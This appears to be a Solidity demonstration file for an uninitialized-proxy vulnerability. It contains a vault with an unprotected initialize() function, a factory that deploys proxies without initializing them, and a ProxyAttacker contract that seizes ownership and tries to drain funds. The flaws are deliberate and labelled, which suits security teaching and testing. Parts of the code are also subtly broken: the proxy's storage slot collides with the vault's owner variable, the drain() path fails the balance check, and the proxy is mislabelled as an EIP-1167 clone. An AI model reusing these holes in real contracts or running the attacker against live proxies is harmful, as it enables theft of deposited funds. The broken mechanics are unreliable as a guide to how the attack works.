// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

/// @title UninitializedProxy - Vulnerable to SWC-109 and initialization attacks
/// @notice Demonstrates uninitialized proxy vulnerability
/// @dev DO NOT USE IN PRODUCTION

// Implementation contract
contract VaultImplementation {
    address public owner;
    mapping(address => uint256) public balances;
    bool public initialized;

    event Initialized(address indexed owner);
    event Deposit(address indexed user, uint256 amount);

    /// @notice VULNERABLE: Missing initializer protection
    /// @dev Can be called by anyone on implementation or uninitialized proxy
    function initialize(address _owner) external {
        require(!initialized, "Already initialized");
        owner = _owner;
        initialized = true;
        emit Initialized(_owner);
    }

    function deposit() external payable {
        require(initialized, "Not initialized");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        require(initialized, "Not initialized");
        require(msg.sender == owner, "Only owner");
        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }
}

// Minimal proxy (EIP-1167 clone)
contract MinimalProxy {
    address public implementation;

    constructor(address _implementation) {
        implementation = _implementation;
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}

/// @title ProxyFactory - Creates vulnerable uninitialized proxies
contract ProxyFactory {
    event ProxyCreated(address indexed proxy, address indexed implementation);

    /// @notice VULNERABLE: Deploys proxy without initializing
    /// @dev Attacker can frontrun and initialize with their address
    function createProxy(address implementation) external returns (address) {
        MinimalProxy proxy = new MinimalProxy(implementation);
        emit ProxyCreated(address(proxy), implementation);

        // VULNERABILITY: No initialization call!
        // Should call: VaultImplementation(address(proxy)).initialize(msg.sender);

        return address(proxy);
    }
}

/// @title ProxyAttacker - Exploits uninitialized proxy
contract ProxyAttacker {
    /// @notice Frontrun initialization and take ownership
    function exploit(address proxy) external {
        VaultImplementation(proxy).initialize(address(this));
        // Now attacker owns the proxy!
    }

    /// @notice Drain funds
    function drain(address proxy) external {
        uint256 balance = address(proxy).balance;
        VaultImplementation(proxy).withdraw(balance);
    }

    receive() external payable {}
}
